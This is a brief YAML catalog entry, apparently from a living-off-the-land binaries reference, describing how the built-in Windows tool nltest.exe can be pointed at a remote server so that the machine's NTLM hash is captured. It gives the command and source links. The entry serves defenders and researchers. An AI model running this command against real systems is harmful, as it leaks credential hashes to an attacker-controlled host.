---
name: Nltest.exe
description: 
functions:
  credentials:
    - description: makes it connect to remote server and NTLM hash can be captured.
      code: nltest.exe /SERVER:192.168.1.10 /QUERY
resources: 
    - resource: https://twitter.com/sysopfb/status/986799053668139009
    - resource: https://ss64.com/nt/nltest.html
fullpath: 
    - path: c:\windows\system32\nltest.exe
notes: Thanks to Sysopfb - @sysopfb
---